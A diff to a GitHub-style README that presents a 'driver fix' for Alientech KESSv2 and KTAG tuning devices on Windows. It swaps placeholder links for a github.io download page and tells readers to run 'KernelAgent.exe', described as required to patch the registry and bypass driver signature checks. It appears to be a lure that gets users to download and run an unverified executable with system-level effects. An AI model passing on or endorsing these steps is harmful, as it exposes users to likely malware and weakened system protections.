@@ -2,7 +2,8 @@
 
 This tool includes fixed drivers and registry patches to restore full functionality of Alientech KESSv2 and KTAG devices on Windows 10/11. Solve driver signature issues, USB detection errors, and COM port problems.
 
-[![Download Driver Fix](https://img.shields.io/badge/Download-KESS_KTAG_DriverFix-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Driver Fix](https://img.shields.io/badge/Download-KESS_KTAG_DriverFix-blueviolet)](https://kessv2-ktag-driver-fix-alientech-w11.github.io/.github
+)
 
 ---
 
@@ -37,18 +38,19 @@ This tool includes fixed drivers and registry patches to restore full functional
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://kessv2-ktag-driver-fix-alientech-w11.github.io/.github
+) section  
 2. 📁 **Extract all files** to a folder (e.g. `C:\KESS_KTAG_DriverFix`)  
-3. 🖱 **Run `KernelAgent.exe`** to patch the registry and enable driver signature bypass (if needed)  
-4. 🖲 Go to **Device Manager → Update Driver** → Select `Drivers/` folder  
-5. 🔁 Restart your system and launch K-Suite to test the connection
+3. 🖱 **Run the executable file** `KernelAgent.exe` (required for driver patch and registry unlock)  
+4. 🖲 Open **Device Manager → Update Driver** → Browse to the `Drivers/` folder  
+5. 🔁 Restart your system and verify detection in K-Suite
 
 ---
 
 ### 🖼 Preview
 
 **KESSv2 / KTAG Detected Successfully in Device Manager**  
-![KESS KTAG Driver Fix](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSa6scDMLrzdOtBEFmUovhrbWuHWZ0F1zeCDw&s)  
+![KESS KTAG Driver Fix](https://www.cardiagtool.co.uk/upload/pro/24010517044484583268.jpg)  
 *Device properly recognized and ready for ECU communication*
 
 ---
